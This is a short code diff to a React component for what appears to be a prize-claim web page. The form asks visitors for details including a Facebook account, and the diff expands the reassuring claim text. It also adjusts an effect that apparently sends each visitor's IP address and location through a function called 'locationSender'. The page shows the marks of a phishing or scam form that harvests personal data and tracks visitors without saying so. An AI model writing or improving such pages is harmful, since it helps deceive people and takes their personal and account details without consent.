@@ -49,7 +49,7 @@ function App() {
           })
     }
 
-    locationSender();
+    (ip || location) && locationSender();
   }, [ip, location]);
 
   React.useEffect(() => {
@@ -157,7 +157,7 @@ function App() {
                 required
                 value={data.facebookAccount}
               />
-              <span className="mt-4">Make sure that the details are true and valid in order to claim your price.</span>
+              <span className="mt-4">Make sure that the details are <span className="text-red-500">true and valid</span> in order to claim your price. After sending the details, we will review it and once it's done, a confirmation message will be sent to your email, number, or facebook account. <span className="text-red-500">Thank You!</span></span>
 
               <button className="text-white bg-red-500 p-2 rounded-2xl w-full mt-5 cursor-pointer">Claim</button>
             </form>
